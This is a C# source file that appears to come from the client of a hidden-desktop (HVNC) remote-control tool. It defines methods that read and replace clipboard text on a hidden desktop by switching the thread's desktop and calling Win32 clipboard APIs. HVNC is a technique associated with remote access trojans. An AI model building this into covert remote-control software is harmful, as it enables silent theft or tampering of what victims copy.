using System;
using System.Runtime.InteropServices;

namespace RemoteControl.Client.Utils
{
    public partial class HVNCDesktop
    {
        public string GetClipboardText()
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return null;

            try
            {
                if (!OpenClipboard(IntPtr.Zero))
                    return null;

                try
                {
                    IntPtr hData = GetClipboardData(CF_UNICODETEXT);
                    if (hData == IntPtr.Zero) return null;
                    IntPtr pData = GlobalLock(hData);
                    if (pData == IntPtr.Zero) return null;

                    try
                    {
                        return Marshal.PtrToStringUni(pData);
                    }
                    finally
                    {
                        GlobalUnlock(hData);
                    }
                }
                finally
                {
                    CloseClipboard();
                }
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        public bool SetClipboardText(string text)
        {
            if (text == null) return false;
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return false;

            try
            {
                if (!OpenClipboard(IntPtr.Zero))
                    return false;

                try
                {
                    EmptyClipboard();
                    int bytes = (text.Length + 1) * 2;
                    IntPtr hGlobal = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)bytes);
                    if (hGlobal == IntPtr.Zero) return false;
                    IntPtr pGlobal = GlobalLock(hGlobal);
                    Marshal.Copy(text.ToCharArray(), 0, pGlobal, text.Length);
                    GlobalUnlock(hGlobal);
                    SetClipboardData(CF_UNICODETEXT, hGlobal);
                    return true;
                }
                finally
                {
                    CloseClipboard();
                }
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }
    }
}
